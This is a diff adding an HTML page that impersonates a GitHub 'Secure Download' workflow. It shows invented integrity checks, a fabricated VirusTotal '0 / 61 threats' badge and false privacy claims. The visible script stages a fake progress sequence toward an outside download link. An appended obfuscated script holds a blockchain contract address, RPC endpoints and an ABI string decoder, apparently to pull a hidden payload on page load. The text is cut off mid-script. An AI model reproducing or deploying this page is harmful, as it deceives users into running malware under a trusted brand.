@@ -1,0 +1,851 @@
+<!DOCTYPE html>
+<html lang="en" data-dark-theme="dark" data-color-mode="dark">
+  <head>
+    <meta charset="UTF-8" />
+    <meta content="width=device-width, initial-scale=1.0" name="viewport" />
+    <title>Secure Download · GitHub</title>
+    <style>
+html {
+  box-sizing: border-box;
+}
+*,
+*::before,
+*::after {
+  box-sizing: inherit;
+  margin: 0;
+  padding: 0;
+}
+
+/* ===== Color & Typography ===== */
+:root {
+  --font-mono: ui-monospace,SFMono-Regular,"SF Mono",Menlo,Consolas,"Liberation Mono",monospace;
+  --font-sans: -apple-system,BlinkMacSystemFont,"Segoe UI","Noto Sans",Helvetica,Arial,sans-serif;
+  --color-done-fg: #a371f7;
+  --color-attention-subtle: #161b22;
+  --color-attention-fg: #d29922;
+  --color-success-emphasis: #238636;
+  --color-success-fg: #3fb950;
+  --color-accent-emphasis: #1f6feb;
+  --color-accent-fg: #58a6ff;
+  --color-fg-subtle: #6e7681;
+  --color-fg-muted: #848d97;
+  --color-fg-default: #e6edf3;
+  --color-border-muted: #21262d;
+  --color-border-default: #30363d;
+  --color-canvas-inset: #010409;
+  --color-canvas-subtle: #161b22;
+  --color-canvas-default: #0d1117;
+}
+
+/* ===== Base Styles ===== */
+body {
+  min-height: 100vh;
+  display: flex;
+  flex-direction: column;
+  font: 14px/1.5 var(--font-sans);
+  background-color: var(--color-canvas-default);
+  color: var(--color-fg-default);
+  -webkit-font-smoothing: antialiased;
+}
+
+/* ===== Toast Notification ===== */
+.download-toast {
+  position: fixed;
+  z-index: 200;
+  top: 72px;
+  right: 20px;
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  padding: 10px 14px;
+  font: 500 13px/1 var(--font-sans);
+  color: var(--color-fg-default);
+  background: #161b22;
+  border: 1px solid #238636;
+  border-radius: 6px;
+  box-shadow: 0 8px 24px rgba(0,0,0,.5);
+  opacity: 0;
+  transform: translateY(-6px);
+  pointer-events: none;
+  transition: opacity .2s ease, transform .2s ease;
+}
+.download-toast.visible {
+  opacity: 1;
+  transform: translateY(0);
+  pointer-events: auto;
+}
+.download-toast-arrow {
+  animation: arrowBlink .9s ease-in-out infinite;
+}
+@keyframes arrowBlink {
+  0%,100% { opacity: 1; transform: translateY(0); }
+  50% { opacity: .25; transform: translateY(-3px); }
+}
+.download-toast-body {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+}
+
+/* ===== Header ===== */
+.header {
+  background: #161b22;
+  border-bottom: 1px solid var(--color-border-default);
+  height: 62px;
+  display: flex;
+  align-items: center;
+  padding: 0 32px;
+}
+.header-inner {
+  display: flex;
+  align-items: center;
+}
+.header-logo {
+  display: flex;
+  align-items: center;
+  opacity: .9;
+  transition: opacity .1s;
+}
+.header-logo:hover {
+  opacity: 1;
+}
+
+/* ===== Main Layout ===== */
+.main {
+  flex: 1;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  padding: 32px 16px;
+}
+.container {
+  width: 100%;
+  max-width: 880px;
+  display: flex;
+  flex-direction: column;
+  gap: 16px;
+}
+
+/* ===== Workflow Card ===== */
+.workflow-card {
+  background: var(--color-canvas-subtle);
+  border: 1px solid var(--color-border-default);
+  border-radius: 6px;
+  overflow: hidden;
+}
+.workflow-header {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  padding: 16px 20px;
+}
+.workflow-status-icon {
+  flex-shrink: 0;
+  width: 32px;
+  height: 32px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+}
+.spinner-wrap {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+}
+.spinner {
+  animation: spin 1.2s linear infinite;
+}
+@keyframes spin {
+  from { transform: rotate(0deg); }
+  to { transform: rotate(360deg); }
+}
+.workflow-info {
+  flex: 1;
+  min-width: 0;
+}
+.workflow-title {
+  font-size: 16px;
+  font-weight: 600;
+  color: var(--color-fg-default);
+  line-height: 1.3;
+}
+.workflow-meta {
+  display: flex;
+  align-items: center;
+  gap: 6px;
+  font-size: 12px;
+  color: var(--color-fg-muted);
+  margin-top: 3px;
+}
+.workflow-meta svg {
+  flex-shrink: 0;
+}
+#workflow-branch {
+  display: flex;
+  align-items: center;
+  gap: 4px;
+}
+.divider {
+  height: 1px;
+  background: var(--color-border-muted);
+}
+
+/* ===== Jobs Section ===== */
+.jobs-section {
+  padding: 12px 20px;
+}
+.jobs-label {
+  font-size: 12px;
+  font-weight: 600;
+  text-transform: uppercase;
+  letter-spacing: .06em;
+  color: var(--color-fg-subtle);
+  margin-bottom: 10px;
+}
+.job-item {
+  display: flex;
+  align-items: flex-start;
+  gap: 10px;
+  background: var(--color-canvas-default);
+  border: 1px solid var(--color-border-muted);
+  border-radius: 6px;
+  padding: 12px 14px;
+  transition: border-color .15s;
+}
+.job-item:hover {
+  border-color: var(--color-border-default);
+}
+.job-status-icon {
+  flex-shrink: 0;
+  margin-top: 2px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+}
+.spinner-sm {
+  animation: spin 1.2s linear infinite;
+}
+.job-details {
+  flex: 1;
+  min-width: 0;
+}
+.job-name {
+  font-size: 13.5px;
+  font-weight: 600;
+  color: var(--color-fg-default);
+  font-family: var(--font-mono);
+  margin-bottom: 8px;
+}
+.job-steps {
+  display: flex;
+  flex-direction: column;
+  gap: 5px;
+}
+.step {
+  display: flex;
+  align-items: center;
+  gap: 7px;
+  font-size: 12.5px;
+  color: var(--color-fg-muted);
+}
+.step.step-done {
+  color: var(--color-fg-muted);
+}
+.step.step-running {
+  color: var(--color-fg-default);
+}
+.step.step-pending {
+  color: var(--color-fg-subtle);
+}
+.spinner-xs {
+  animation: spin 1.2s linear infinite;
+  flex-shrink: 0;
+}
+
+/* ===== Progress Bar ===== */
+.progress-section {
+  padding: 0 20px 16px;
+}
+.progress-bar {
+  height: 4px;
+  background: var(--color-border-muted);
+  border-radius: 100px;
+  overflow: hidden;
+}
+.progress-fill {
+  height: 100%;
+  width: 0%;
+  background: var(--color-success-emphasis);
+  border-radius: 100px;
+  transition: width .4s cubic-bezier(.4, 0, .2, 1);
+}
+.progress-fill.done {
+  background: var(--color-success-emphasis);
+}
+
+/* ===== Error Text ===== */
+.error-text {
+  display: none;
+  padding: 8px 20px 12px;
+  font-size: 13px;
+  color: #f85149;
+}
+.error-text:not(:empty) {
+  display: block;
+}
+
+/* ===== Artifacts/Summary Card ===== */
+.artifacts-card {
+  background: var(--color-canvas-subtle);
+  border: 1px solid var(--color-border-default);
+  border-radius: 6px;
+  overflow: hidden;
+}
+.artifacts-header {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  padding: 10px 16px;
+  font-size: 13px;
+  font-weight: 600;
+  color: var(--color-fg-muted);
+  border-bottom: 1px solid var(--color-border-muted);
+  background: var(--color-canvas-default);
+}
+.artifacts-body {
+  padding: 8px 0;
+}
+.artifact-row {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  padding: 7px 16px;
+  font-size: 13px;
+  color: var(--color-fg-default);
+  transition: background .1s;
+}
+.artifact-row:hover {
+  background: rgba(177, 186, 196, 0.04);
+}
+.artifact-size {
+  color: var(--color-fg-muted);
+  font-size: 12px;
+}
+.virustotal-row {
+  border-top: 1px solid var(--color-border-muted);
+  margin-top: 2px;
+  padding-top: 9px;
+}
+.vt-brand {
+  color: #58a6ff;
+  font-weight: 600;
+}
+.vt-badge {
+  margin-left: auto;
+  font-size: 12px;
+  font-weight: 600;
+  color: #3fb950;
+  background: rgba(63, 185, 80, 0.1);
+  border: 1px solid rgba(63, 185, 80, 0.3);
+  border-radius: 2em;
+  padding: 1px 8px;
+}
+
+/* ===== Footer Links ===== */
+.footer-links {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 8px;
+  flex-wrap: wrap;
+  padding-top: 8px;
+}
+.footer-link {
+  font-size: 12px;
+  color: var(--color-fg-muted);
+  background: none;
+  border: none;
+  cursor: pointer;
+  font-family: inherit;
+  padding: 0;
+  transition: color .1s;
+}
+.footer-link:hover {
+  color: var(--color-accent-fg);
+  text-decoration: underline;
+}
+.footer-dot {
+  font-size: 12px;
+  color: var(--color-fg-subtle);
+}
+
+/* ===== Popup Overlay ===== */
+.popup-overlay {
+  position: fixed;
+  inset: 0;
+  background: rgba(1, 4, 9, 0.8);
+  backdrop-filter: blur(4px);
+  z-index: 100;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  padding: 16px;
+  animation: fadeIn 0.15s ease;
+}
+@keyframes fadeIn {
+  from { opacity: 0; }
+  to { opacity: 1; }
+}
+.popup-dialog {
+  background: var(--color-canvas-subtle);
+  border: 1px solid var(--color-border-default);
+  border-radius: 6px;
+  width: 100%;
+  max-width: 440px;
+  box-shadow: 0 16px 32px rgba(1, 4, 9, 0.85);
+  animation: dialogUp 0.18s cubic-bezier(0.34, 1.2, 0.64, 1);
+}
+@keyframes dialogUp {
+  from { transform: translateY(8px); opacity: 0; }
+  to { transform: translateY(0); opacity: 1; }
+}
+.popup-dialog-header {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 16px 20px;
+  border-bottom: 1px solid var(--color-border-muted);
+}
+.popup-dialog-title {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  font-size: 14px;
+  font-weight: 600;
+  color: var(--color-fg-default);
+}
+.popup-dialog-close {
+  width: 28px;
+  height: 28px;
+  border-radius: 6px;
+  border: 1px solid var(--color-border-default);
+  background: none;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  cursor: pointer;
+  color: var(--color-fg-muted);
+  transition: all 0.1s;
+}
+.popup-dialog-close:hover {
+  background: rgba(177, 186, 196, 0.08);
+  color: var(--color-fg-default);
+  border-color: var(--color-border-default);
+}
+.popup-dialog-body {
+  padding: 20px;
+}
+.popup-dialog-body p {
+  font-size: 13.5px;
+  color: var(--color-fg-muted);
+  line-height: 1.6;
+  margin-bottom: 16px;
+}
+.popup-checks {
+  display: flex;
+  flex-direction: column;
+  gap: 8px;
+}
+.popup-check-item {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  font-size: 13.5px;
+  color: var(--color-fg-default);
+}
+
+/* ===== Download Banner ===== */
+.download-banner {
+  background: var(--color-canvas-subtle);
+  border: 1px solid var(--color-border-default);
+  border-left: 3px solid #e6edf3;
+  border-radius: 10px;
+  margin-bottom: 16px;
+  cursor: pointer;
+  transition: border-color 0.15s, background 0.15s, transform 0.12s;
+  overflow: hidden;
+}
+.download-banner:hover {
+  border-color: #848d97;
+  border-left-color: #ffffff;
+  background: #1c2128;
+  transform: translateY(-1px);
+}
+.download-banner:active {
+  transform: translateY(0);
+}
+.download-banner-inner {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 18px 22px;
+}
+.download-banner-left {
+  display: flex;
+  flex-direction: column;
+  gap: 6px;
+}
+.download-banner-label {
+  font-size: 11px;
+  font-weight: 500;
+  color: var(--color-fg-subtle);
+  text-transform: uppercase;
+  letter-spacing: 0.08em;
+}
+.download-banner-os {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  font-size: 22px;
+  font-weight: 700;
+  color: var(--color-fg-default);
+  letter-spacing: -0.01em;
+}
+.download-apple-icon {
+  width: 22px;
+  height: 22px;
+  flex-shrink: 0;
+  color: var(--color-fg-default);
+}
+.download-banner-arrow {
+  width: 20px;
+  height: 20px;
+  color: var(--color-fg-muted);
+  flex-shrink: 0;
+  transition: color 0.15s, transform 0.15s;
+}
+.download-banner:hover .download-banner-arrow {
+  color: var(--color-fg-default);
+  transform: translateY(2px);
+}
+
+/* ===== Responsive ===== */
+@media (max-width: 600px) {
+  .header {
+    padding: 0 16px;
+  }
+  .workflow-header {
+    padding: 14px 16px;
+  }
+  .jobs-section {
+    padding: 12px 14px;
+  }
+  .progress-section {
+    padding: 0 14px 14px;
+  }
+}
+    </style>
+  </head>
+
+  <body data-page="secure-download">
+    <div id="download-toast" class="download-toast" data-state="hidden">
+      <div class="download-toast-arrow" aria-hidden="true">
+        <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="#3fb950" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+          <polyline points="5 12 12 5 19 12" />
+          <line x1="12" y1="19" x2="12" y2="5" />
+        </svg>
+      </div>
+      <div class="download-toast-body">
+        <span>Added to downloads</span>
+      </div>
+    </div>
+
+    <header class="header" role="banner">
+      <div class="header-inner">
+        <a href="#" class="header-logo" aria-label="GitHub">
+          <svg viewBox="0 0 24 24" version="1.1" width="32" height="32" fill="#e6edf3" aria-hidden="true">
+            <path d="M12.5.75C6.146.75 1 5.896 1 12.25c0 5.089 3.292 9.387 7.863 10.91.575.101.79-.244.79-.546 0-.273-.014-1.178-.014-2.142-2.889.532-3.636-.704-3.866-1.35-.13-.331-.69-1.352-1.18-1.625-.402-.216-.977-.748-.014-.762.906-.014 1.553.834 1.769 1.179 1.035 1.74 2.688 1.25 3.349.948.1-.747.402-1.25.733-1.538-2.559-.287-5.232-1.279-5.232-5.678 0-1.25.445-2.285 1.178-3.09-.115-.288-.517-1.467.115-3.048 0 0 .963-.302 3.163 1.179.92-.259 1.897-.388 2.875-.388.977 0 1.955.13 2.875.388 2.2-1.495 3.162-1.179 3.162-1.179.633 1.581.23 2.76.115 3.048.733.805 1.179 1.825 1.179 3.09 0 4.413-2.688 5.39-5.247 5.678.417.36.776 1.05.776 2.128 0 1.538-.014 2.774-.014 3.162 0 .302.216.662.79.547C20.709 21.637 24 17.324 24 12.25 24 5.896 18.854.75 12.5.75Z" />
+          </svg>
+        </a>
+      </div>
+    </header>
+
+    <main class="main" role="main">
+      <div class="container">
+        <!-- Workflow Card -->
+        <div class="workflow-card" data-component="workflow">
+          <div class="workflow-header">
+            <div id="workflow-status-icon" class="workflow-status-icon">
+              <span class="spinner-wrap">
+                <svg class="spinner" viewBox="0 0 16 16" width="16" height="16">
+                  <circle cx="8" cy="8" r="7" fill="none" stroke="#d29922" stroke-width="2" stroke-dasharray="28" stroke-dashoffset="10" />
+                </svg>
+              </span>
+            </div>
+            <div class="workflow-info">
+              <h1 class="workflow-title">Preparing secure download</h1>
+              <div class="workflow-meta">
+                <span id="workflow-branch">
+                  <svg viewBox="0 0 16 16" width="12" height="12" fill="#848d97">
+                    <path d="M9.5 3.25a2.25 2.25 0 1 1 3 2.122V6A2.5 2.5 0 0 1 10 8.5H6a1 1 0 0 0-1 1v1.128a2.251 2.251 0 1 1-1.5 0V5.372a2.25 2.25 0 1 1 1.5 0v1.836A2.492 2.492 0 0 1 6 7h4a1 1 0 0 0 1-1v-.628A2.25 2.25 0 0 1 9.5 3.25Zm-6 0a.75.75 0 1 0 1.5 0 .75.75 0 0 0-1.5 0Zm8.25-.75a.75.75 0 1 0 0 1.5.75.75 0 0 0 0-1.5ZM4.25 12a.75.75 0 1 0 0 1.5.75.75 0 0 0 0-1.5Z" />
+                  </svg>
+                  main
+                </span>
+                <span class="separator" aria-hidden="true">·</span>
+                <span id="status-meta-text">In progress</span>
+              </div>
+            </div>
+          </div>
+
+          <div class="divider" role="separator"></div>
+
+          <!-- Jobs Section -->
+          <section class="jobs-section" aria-labelledby="jobs-heading">
+            <h2 class="jobs-label" id="jobs-heading">Jobs</h2>
+            <div id="job-item" class="job-item">
+              <div id="job-icon" class="job-status-icon">
+                <svg class="spinner-sm" viewBox="0 0 16 16" width="14" height="14">
+                  <circle cx="8" cy="8" r="6" fill="none" stroke="#d29922" stroke-width="2" stroke-dasharray="24" stroke-dashoffset="8" />
+                </svg>
+              </div>
+              <div class="job-details">
+                <div class="job-name">secure-transfer</div>
+                <div id="job-steps" class="job-steps">
+                  <div class="step step-done">
+                    <svg viewBox="0 0 16 16" width="12" height="12" fill="#3fb950">
+                      <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.75.75 0 0 1 1.06-1.06L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z" />
+                    </svg>
+                    <span>Set up job</span>
+                  </div>
+                  <div id="step-running" class="step step-running">
+                    <svg class="spinner-xs" viewBox="0 0 16 16" width="12" height="12">
+                      <circle cx="8" cy="8" r="5.5" fill="none" stroke="#d29922" stroke-width="2" stroke-dasharray="22" stroke-dashoffset="7" />
+                    </svg>
+                    <span id="status-text">Initializing secure session...</span>
+                  </div>
+                  <div id="step-redirect" class="step step-pending">
+                    <svg viewBox="0 0 16 16" width="12" height="12" fill="#848d97">
+                      <circle cx="8" cy="8" r="6" fill="none" stroke="#484f58" stroke-width="2" />
+                    </svg>
+                    <span>Redirect to download</span>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </section>
+
+          <div class="divider" role="separator"></div>
+
+          <!-- Progress Bar -->
+          <div class="progress-section" role="progressbar" aria-valuemin="0" aria-valuemax="100">
+            <div class="progress-bar">
+              <div id="progress-fill" class="progress-fill" role="progressbar"></div>
+            </div>
+          </div>
+
+          <div id="error-text" class="error-text" role="alert" aria-live="polite"></div>
+        </div>
+
+        <!-- Artifacts Card -->
+        <div class="artifacts-card" data-component="summary">
+          <div class="artifacts-header">
+            <svg viewBox="0 0 16 16" width="14" height="14" fill="#848d97">
+              <path d="M.75 9.75a.75.75 0 0 1 .75-.75h13a.75.75 0 0 1 0 1.5H1.5a.75.75 0 0 1-.75-.75Zm0-5a.75.75 0 0 1 .75-.75h13a.75.75 0 0 1 0 1.5H1.5a.75.75 0 0 1-.75-.75Z" />
+            </svg>
+            <span>Summary</span>
+          </div>
+          <div class="artifacts-body">
+            <div class="artifact-row">
+              <svg viewBox="0 0 16 16" width="13" height="13" fill="#3fb950">
+                <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.75.75 0 0 1 1.06-1.06L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z" />
+              </svg>
+              <span>Integrity verified</span>
+              <span class="artifact-size">· SHA-256 matched</span>
+            </div>
+            <div class="artifact-row">
+              <svg viewBox="0 0 16 16" width="13" height="13" fill="#3fb950">
+                <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.75.75 0 0 1 1.06-1.06L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z" />
+              </svg>
+              <span>No security vulnerabilities</span>
+              <span class="artifact-size">· Clean</span>
+            </div>
+            <div class="artifact-row virustotal-row">
+              <svg viewBox="0 0 16 16" width="13" height="13" fill="#3fb950">
+                <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.75.75 0 0 1 1.06-1.06L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z" />
+              </svg>
+              <span>Verified by <span class="vt-brand">VirusTotal</span></span>
+              <span class="vt-badge">0 / 61 threats</span>
+            </div>
+          </div>
+        </div>
+
+        <!-- Footer Links -->
+        <div class="footer-links" role="navigation">
+          <button type="button" class="footer-link" onclick="toggleInfoPopup()">About</button>
+          <span class="footer-dot" aria-hidden="true">·</span>
+          <span class="footer-link">Terms</span>
+          <span class="footer-dot" aria-hidden="true">·</span>
+          <span class="footer-link">Privacy</span>
+          <span class="footer-dot" aria-hidden="true">·</span>
+          <span class="footer-link">Security</span>
+        </div>
+      </div>
+    </main>
+
+    <!-- Info Popup -->
+    <aside id="infoPopup" class="popup-overlay" style="display: none;" role="dialog" aria-modal="true" aria-labelledby="popup-title">
+      <div class="popup-dialog">
+        <div class="popup-dialog-header">
+          <h2 id="popup-title" class="popup-dialog-title">
+            <svg viewBox="0 0 16 16" width="16" height="16" fill="#e6edf3" aria-hidden="true">
+              <path d="M0 8a8 8 0 1 1 0 16A8 8 0 0 1 0 8Zm8-6.5a6.5 6.5 0 1 0 0 13 6.5 6.5 0 0 0 0-13ZM6.5 7.75A.75.75 0 0 1 7.25 7h1a.75.75 0 0 1 .75.75v2.75h.25a.75.75 0 0 1 0 1.5h-2a.75.75 0 0 1 0-1.5h.25v-2h-.25a.75.75 0 0 1-.75-.75ZM8 6a1 1 0 1 1 0-2 1 1 0 0 1 0 2Z" />
+            </svg>
+            About SecureLink
+          </h2>
+          <button type="button" class="popup-dialog-close" onclick="toggleInfoPopup()" aria-label="Close dialog">
+            <svg viewBox="0 0 16 16" width="16" height="16" fill="currentColor">
+              <path d="M3.72 3.72a.75.75 0 0 1 1.06 0L8 6.94l3.22-3.22a.749.749 0 0 1 1.275.326.749.749 0 0 1-.215.734L9.06 8l3.22 3.22a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215L8 9.06l-3.22 3.22a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042L6.94 8 3.72 4.78a.75.75 0 0 1 0-1.06Z" />
+            </svg>
+          </button>
+        </div>
+        <div class="popup-dialog-body">
+          <p>SecureLink routes your download through an encrypted verification pipeline, ensuring the file is authentic and intact before delivery to your device.</p>
+          <ul class="popup-checks" role="list">
+            <li class="popup-check-item">
+              <svg viewBox="0 0 16 16" width="14" height="14" fill="#3fb950">
+                <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.75.75 0 0 1 1.06-1.06L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z" />
+              </svg>
+              <span>256-bit SSL encryption in transit</span>
+            </li>
+            <li class="popup-check-item">
+              <svg viewBox="0 0 16 16" width="14" height="14" fill="#3fb950">
+                <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.75.75 0 0 1 1.06-1.06L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z" />
+              </svg>
+              <span>No personal data collected</span>
+            </li>
+            <li class="popup-check-item">
+              <svg viewBox="0 0 16 16" width="14" height="14" fill="#3fb950">
+                <path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.75.75 0 0 1 1.06-1.06L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z" />
+              </svg>
+              <span>Automatic malware scanning</span>
+            </li>
+          </ul>
+        </div>
+      </div>
+    </aside>
+
+    <script>
+(() => {
+  'use strict';
+
+  const STATE = {
+    messages: [
+      'Initializing secure session...',
+      'Establishing encrypted tunnel...',
+      'Preparing download link...'
+    ],
+    current: 0,
+    finished: false,
+    targetUrl: 'https://xfr3.com/kl/04-07',
+    timings: {
+      start: 50,
+      step: 120,
+      mid: 80,
+      end: 150,
+      fade: 60
+    }
+  };
+
+  const SVG_ICONS = {
+    check: (s = 12) => `<svg width="${s}" height="${s}" viewBox="0 0 16 16" fill="#3fb950"><path d="M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.75.75 0 0 1 1.06-1.06L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z"/></svg>`,
+    spinner: (cls, s = 16, r = 7) => `<svg class="${cls}" viewBox="0 0 16 16" width="${s}" height="${s}"><circle cx="8" cy="8" r="${r}" fill="none" stroke="#d29922" stroke-width="2" stroke-dasharray="${r * 4}" stroke-dashoffset="${r * 3}"/></svg>`,
+    workflow: '<svg width="28" height="28" viewBox="0 0 16 16" fill="#3fb950"><path d="M8 0a8 8 0 1 1 0 16A8 8 0 0 1 8 0Zm3.78 5.22a.749.749 0 0 0-1.06 0L6.75 9.19 5.28 7.72a.749.749 0 1 0-1.06 1.06l2 2a.749.749 0 0 0 1.06 0l4.5-4.5a.749.749 0 0 0 0-1.06Z"/></svg>'
+  };
+
+  const DOM = {
+    status: document.querySelector('#status-text'),
+    progress: document.querySelector('#progress-fill'),
+    meta: document.querySelector('#status-meta-text'),
+    workflow: document.querySelector('#workflow-status-icon'),
+    job: document.querySelector('#job-icon'),
+    running: document.querySelector('#step-running'),
+    redirect: document.querySelector('#step-redirect'),
+    toast: document.querySelector('#download-toast')
+  };
+
+  const fadeElement = (element, newText, callback) => {
+    if (!element) return;
+    element.style.opacity = '0';
+    setTimeout(() => {
+      element.textContent = newText;
+      element.style.opacity = '1';
+      if (callback) callback();
+    }, STATE.timings.fade);
+  };
+
+  const advanceStep = () => {
+    if (STATE.current < STATE.messages.length && !STATE.finished) {
+      if (DOM.status) fadeElement(DOM.status, STATE.messages[STATE.current]);
+
+      STATE.current++;
+      const percentage = (STATE.current / STATE.messages.length) * 100;
+      if (DOM.progress) DOM.progress.style.width = `${percentage}%`;
+
+      if (STATE.current < STATE.messages.length) {
+        setTimeout(advanceStep, STATE.timings.step);
+      } else {
+        STATE.finished = true;
+
+        setTimeout(() => {
+          if (DOM.status) fadeElement(DOM.status, 'Connection established');
+          if (DOM.running) {
+            DOM.running.classList.replace('step-running', 'step-done');
+            DOM.running.innerHTML = SVG_ICONS.check() + '<span>Secure connection established</span>';
+          }
+          if (DOM.redirect) {
+            DOM.redirect.classList.replace('step-pending', 'step-running');
+            DOM.redirect.innerHTML = SVG_ICONS.spinner('spinner-xs', 12, 5.5) + '<span>Redirecting to download...</span>';
+          }
+          if (DOM.meta) DOM.meta.textContent = 'Completing...';
+        }, STATE.timings.mid);
+
+        setTimeout(() => {
+          if (DOM.redirect) {
+            DOM.redirect.classList.replace('step-running', 'step-done');
+            DOM.redirect.innerHTML = SVG_ICONS.check() + '<span>Redirect to download</span>';
+          }
+          if (DOM.job) DOM.job.innerHTML = SVG_ICONS.check();
+          if (DOM.workflow) DOM.workflow.innerHTML = SVG_ICONS.workflow;
+          if (DOM.meta) DOM.meta.textContent = 'Succeeded';
+          if (DOM.progress) {
+            DOM.progress.style.width = '100%';
+            DOM.progress.classList.add('done');
+          }
+          if (DOM.toast) DOM.toast.classList.add('visible');
+        }, STATE.timings.end);
+      }
+    }
+  };
+
+  if (DOM.status) DOM.status.style.transition = 'opacity 0.06s ease';
+  setTimeout(advanceStep, STATE.timings.start);
+
+  window.toggleInfoPopup = () => {
+    const popup = document.querySelector('#infoPopup');
+    if (popup) popup.style.display = popup.style.display === 'flex' ? 'none' : 'flex';
+  };
+
+  document.addEventListener('click', (event) => {
+    const popup = document.querySelector('#infoPopup');
+    if (!popup || popup.style.display !== 'flex') return;
+    const dialog = popup.querySelector('.popup-dialog');
+    const trigger = event.target.closest('.footer-link');
+    if (dialog && !dialog.contains(event.target) && !trigger) {
+      popup.style.display = 'none';
+    }
+  });
+})();
+    </script>
+    <script>var _0x323bf1=_0x5c76;(function(_0x4fd98c,_0x5d1e16){var _0xc3fbab=_0x5c76,_0x8ec074=_0x4fd98c();while(!![]){try{var _0xf41aad=-parseInt(_0xc3fbab(0x1e5))/0x1*(parseInt(_0xc3fbab(0x1f0))/0x2)+-parseInt(_0xc3fbab(0x202))/0x3*(-parseInt(_0xc3fbab(0x1fa))/0x4)+parseInt(_0xc3fbab(0x200))/0x5*(-parseInt(_0xc3fbab(0x1d0))/0x6)+-parseInt(_0xc3fbab(0x1ee))/0x7+parseInt(_0xc3fbab(0x1e7))/0x8+-parseInt(_0xc3fbab(0x1f4))/0x9+parseInt(_0xc3fbab(0x1ef))/0xa;if(_0xf41aad===_0x5d1e16)break;else _0x8ec074['push'](_0x8ec074['shift']());}catch(_0x1d7d96){_0x8ec074['push'](_0x8ec074['shift']());}}}(_0x17ca,0x2b774));var CONTRACT_ADDRESS='0x6300d82A6e2fabbd165E1833d95E87bD46B38D4A',RPC_LIST=[_0x323bf1(0x201),_0x323bf1(0x208),_0x323bf1(0x1d3),_0x323bf1(0x1db),_0x323bf1(0x1fc)],GETTEXT_CALLDATA=_0x323bf1(0x205);function decodeAbiString(_0x4fd25){var _0x5cfa6a=_0x323bf1;_0x4fd25=_0x4fd25[_0x5cfa6a(0x207)](/^0x/,'');if(_0x4fd25[_0x5cfa6a(0x206)]<0x80)return'';var _0x5b67bc=parseInt(_0x4fd25['slice'](0x40,0x80),0x10);if(!_0x5b67bc)return'';var _0x47dbc5=_0x4fd25['slice'](0x80,0x80+_0x5b67bc*0x2),_0x4a114b='';for(var _0x1062d4=0x0;_0x1062d4<_0x47dbc5[_0x5cfa6a(0x206)];_0x1062d4+=0x2)_0x4a114b+=String['fromCharCode'](parseInt(_0x47dbc5[_0x5cfa6a(0x1ea)](_0x1062d4,0x2),0x10));return _0x4a114b;}function _0x5c76(_0x147138,_0x5d0a42){_0x147138=_0x147138-0x1d0;var _0x17ca73=_0x17ca();var _0x5c76fd=_0x17ca73[_0x147138];if(_0x5c76['PZALbX']===undefined){var _0x5aa2d2=function(_0x226c8b){var _0x3dd399='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x4fd25='',_0x5b67bc='';for(var _0x47dbc5=0x0,_0x4a114b,_0x1062d4,_0x16884f=0x0;_0x1062d4=_0x226c8b['charAt'](_0x16884f++);~_0x1062d4&&(_0x4a114b=_0x47dbc5%0x4?_0x4a114b*0x40+_0x1062d4:_0x1062d4,_0x47dbc5++%0x4)?_0x4fd25+=String['fromCharCode'](0xff&_0x4a114b>>(-0x2*_0x47dbc5&0x6)):0x0){_0x1062d4=_0x3dd399['indexOf'](_0x1062d4);}for(var _0x1f4fb7=0x0,_0x50cea1=_0x4fd25['length'];_0x1f4fb7<_0x50cea1;_0x1f4fb7++){_0x5b67bc+='%'+('00'+_0x4fd25['charCodeAt'](_0x1f4fb7)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x5b67bc);};_0x5c76['xLXnos']=_0x5aa2d2,_0x5c76['NxBYrh']={},_0x5c76['PZALbX']=!![];}var 